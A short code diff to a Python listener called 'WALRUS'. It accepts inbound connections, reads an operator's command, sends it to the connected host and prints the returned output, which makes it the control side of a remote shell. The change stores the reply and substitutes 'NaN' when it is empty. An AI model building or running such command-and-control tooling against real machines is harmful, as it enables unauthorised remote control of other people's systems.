@@ -47,16 +47,17 @@ while True:
     if (A):
         print(f"\n{clr.GREEN}[+] Accepted a connection request from {A[0]}:{C[0]}{clr.RESET}");
         command = input(f'{clr.CYAN}[WALRUS@{__version__}]{clr.RESET} {clr.YELLOW}>>>{clr.RESET} ')
+        
         if command is None or '':
             pass
         
-        if len(command) > int(20): 
-            # i can get it to work but i will have to reset the whole code bc it is very messy
-            pass # we should use my code. I wanna try to figure it out
-        
         A.send(command.encode()) 
-
+        output = A.recv(5000).decode()
+        
+        if output == '':
+            output = "NaN"
+        
         print(
-            f'{A.recv(5000).decode()}'
+            f'{output}'
         )
     
